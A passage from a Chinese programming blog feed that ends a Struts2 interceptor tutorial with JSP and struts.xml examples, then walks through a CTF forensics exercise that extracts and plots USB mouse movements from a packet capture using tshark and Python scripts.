class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_del&quot;</span>&gt;</span>book del<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_add&quot;</span>&gt;</span>book add<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_update&quot;</span>&gt;</span>book update<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/chapter03/book_find&quot;</span>&gt;</span>book find<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>成功页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>用户$&#123;user.username&#125;操作成功<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts2&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 声明拦截器 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span> </span><br><span class="hljs-tag">             <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.interceptor.PrivilegeInterceptor&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;privilege&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 用户登录操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.LoginAction&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;input&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 关于book操作 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;book_*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.BookAction&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">method</span>=<span class="hljs-string">&quot;&#123;1&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span>&gt;</span>/login.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myStack&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发布项目，访问main.jsp<br><img src="https://img-blog.csdnimg.cn/20210416221426697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击连接，由于没有登陆，所以没有权限，页面跳转到登录页面要求用户登录。<br><img src="https://img-blog.csdnimg.cn/20210416221438400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登陆成功后点击链接，跳转成功页面，提示用户操作成功。<br><img src="https://img-blog.csdnimg.cn/20210416222502828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>对比可知拦截器成功执行</p><p>以上案例中，创建了一个方法过滤器PrivilegeInterceptor，在struts.xml中配置了该拦截器，如果用户没有登陆，将无法对页面链接进行相应操作，只有登陆后的用户才有权限操作页面相应功能。</p><h2 id="拦截器工作原理"><a href="#拦截器工作原理" class="headerlink" title="拦截器工作原理"></a>拦截器工作原理</h2><p><strong>拦截器的执行顺序</strong><br>invocation.invoke()方法是拦截器框架的实现核心，通过确定invocation.invoke()方法执行位置，来实现Action执行前后处理操作，在invocation.invoke()方法之前的代码将依据配置中拦截器顺序依次执行，直到走完拦截器后再执行invocation.invoke()方法调用Action，然后再依据配置中拦截器顺序反向执行invocation.invoke()方法后的代码，直到走完拦截器</p><p><strong>拦截器的工作原理</strong><br>如图所示<br><img src="https://img-blog.csdnimg.cn/2021042220560043.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>每一个Action请求都包装在一系列的拦截器的内部。拦截器可以在Action执行直线做相似的操作也可以在Action执行直后做回收操作。</p><p>每一个Action既可以将操作转交给下面的拦截器，Action也可以直接退出操作返回客户既定的画面。</p><p><a href="https://www.cnblogs.com/yw-ah/p/5761235.html">https://www.cnblogs.com/yw-ah/p/5761235.html</a><br><a href="https://www.cnblogs.com/wkrbky/p/5894315.html">https://www.cnblogs.com/wkrbky/p/5894315.html</a><br><a href="https://blog.csdn.net/weixin_42529699/article/details/81354355">https://blog.csdn.net/weixin_42529699/article/details/81354355</a><br><a href="https://www.imooc.com/learn/450">https://www.imooc.com/learn/450</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：Struts2框架学习笔记（三）&lt;/p&gt;</summary>
    
    
    
    <category term="编程开发" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    <category term="JAVA" scheme="http://atkx.top/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/JAVA/"/>
    
    
    <category term="Struts2" scheme="http://atkx.top/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>USB流量分析</title>
    <link href="http://atkx.top/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://atkx.top/2021/04/12/USB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-04-12T04:58:33.024Z</published>
    <updated>2021-05-04T14:46:12.602Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：USB流量分析</p> <a id="more"></a><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">当取0×00时,代表没有按键<br>当取0×01时,代表按左键<br>当取0×02时,代表当前按键为右键<br></code></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标右移像素位；<br>值为负时，代表鼠标左移像素位。<br></code></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标上移像素位；<br>值为负时，代表鼠标下移像素位。<br></code></pre></td></tr></table></figure><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><p><strong>题目</strong><br>方法1：<br>基于python2的UsbMiceHacker.py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>还有基于python3的<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHT代表右键</span><br></code></pre></td></tr></table></figure><p>我这里什么也没有<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>贴上其他人成功的结果<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法2：<br>提取鼠标流量数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行，亲身经历，这步很重要，包含空行会得到错误结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>没有冒号，使用脚本添加冒号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>运行脚本，得到out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用mouse.py脚本，通过更改btn_flag的值来测试鼠标左右键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>经过测试是鼠标右键流量，在生成的xy.txt中可以得到坐标：<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看了<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">大师傅的wp</a>，发现我们添加冒号得到的内容不一样</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>大师傅直接提取鼠标流量，含有冒号，而我提取出来的不含冒号，是Wireshark版本不同的缘故，在网上找到老版本的Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 